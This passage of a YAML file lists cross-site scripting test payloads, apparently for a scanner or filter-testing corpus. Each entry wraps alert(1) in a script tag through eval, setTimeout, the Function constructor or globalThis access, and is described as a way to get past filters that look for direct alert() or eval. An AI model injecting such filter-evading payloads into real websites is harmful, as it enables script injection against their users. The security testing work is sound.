  - id: "basic-008"
    name: "Script with eval"
    category: "basic"
    context: "html_body"
    payload: "<script>eval('alert(1)')</script>"
    description: "Uses eval() — bypasses filters that only look for direct alert()."
    tags: ["basic", "script_tag", "obfuscation"]
    browsers: ["all"]
    interaction: false

  - id: "basic-009"
    name: "Script with setTimeout string"
    category: "basic"
    context: "html_body"
    payload: "<script>setTimeout('alert(1)',0)</script>"
    description: "setTimeout with string argument acts as eval."
    tags: ["basic", "script_tag", "obfuscation"]
    browsers: ["all"]
    interaction: false

  - id: "basic-010"
    name: "Script with Function constructor"
    category: "basic"
    context: "html_body"
    payload: "<script>new Function('alert(1)')()</script>"
    description: "Function constructor — another eval equivalent."
    tags: ["basic", "script_tag", "obfuscation"]
    browsers: ["all"]
    interaction: false

  - id: "basic-011"
    name: "Script with globalThis eval"
    category: "basic"
    context: "html_body"
    payload: "<script>globalThis['eval']('alert(1)')</script>"
    description: "Obfuscated eval access via globalThis — bypasses direct eval regex."
    tags: ["basic", "script_tag", "obfuscation", "2025"]
    browsers: ["all"]
    interaction: false

  - id: "basic-012"
    name: "Script with Reflect.construct"
    category: "basic"
    context: "html_body"
